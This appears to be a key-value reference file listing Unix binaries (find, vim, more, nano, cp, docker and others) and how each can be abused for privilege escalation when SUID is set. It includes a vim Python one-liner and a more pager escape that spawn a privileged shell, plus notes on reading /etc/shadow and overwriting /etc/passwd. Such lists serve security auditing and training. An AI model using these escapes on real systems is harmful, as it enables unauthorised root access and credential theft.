find.notes: find with SUID can execute arbitrary commands as root via -exec flag

vim.exploit: vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
vim.notes: vim can spawn a shell from its command mode using :! or Python integration

vi.notes: vi can spawn a shell from command mode with :!/bin/sh

awk.notes: awk can execute system commands via its BEGIN block

perl.notes: perl can exec a shell directly; SUID perl gives root shell

python.notes: Python os.execl can replace the process with a privileged shell

python2.notes: Python2 os.execl can replace the process with a privileged shell

python3.notes: Python3 os.execl can replace the process with a privileged shell

nmap.notes: Old nmap versions have --interactive mode that drops to a shell; newer nmap supports NSE scripting

less.notes: less can execute shell commands via the ! operator

more.exploit: more /etc/passwd then type: !/bin/sh (if output is longer than screen)
more.notes: more can execute shell commands via the ! operator when in pager mode

tar.notes: tar supports checkpoint actions that can execute arbitrary commands

cp.notes: SUID cp can overwrite critical files like /etc/passwd or /etc/sudoers

nano.exploit: nano then Ctrl+R Ctrl+X to execute commands
nano.notes: nano editor can read from command output via Ctrl+R Ctrl+X

bash.notes: bash -p runs with EUID preserved, giving a root shell when SUID bit is set

sh.notes: sh -p preserves the effective UID, yielding a privileged shell

dash.notes: dash -p preserves the effective UID, yielding a privileged shell

cat.notes: SUID cat can read privileged files like /etc/shadow to extract password hashes

tee.notes: SUID tee can write to any file including /etc/passwd

sed.notes: SUID sed can execute commands via the e flag

env.notes: env with SUID preserves elevated privileges when spawning a shell

ruby.notes: ruby exec can replace the process with a privileged shell

lua.notes: lua os.execute can spawn a privileged shell

php.notes: PHP pcntl_exec can spawn a privileged shell

gawk.notes: gawk system() can execute arbitrary commands with elevated privileges

strace.notes: SUID strace can be used to execute commands with elevated privileges

node.notes: Node.js child_process can spawn a privileged shell

make.notes: make can execute arbitrary commands through its build rules

zip.notes: zip -T flag can execute arbitrary commands for testing

socat.notes: socat with SUID can open an interactive root shell

screen.notes: screen multiplexer can execute shell commands in privileged context

tmux.notes: tmux with SUID can create a new privileged shell session

docker.notes: Access to docker group is equivalent to root — can mount host filesystem

git.notes: git with SUID can execute commands via GIT_SSH_COMMAND or hooks

curl.notes: SUID curl can read arbitrary files as root

wget.notes: SUID wget can overwrite system files
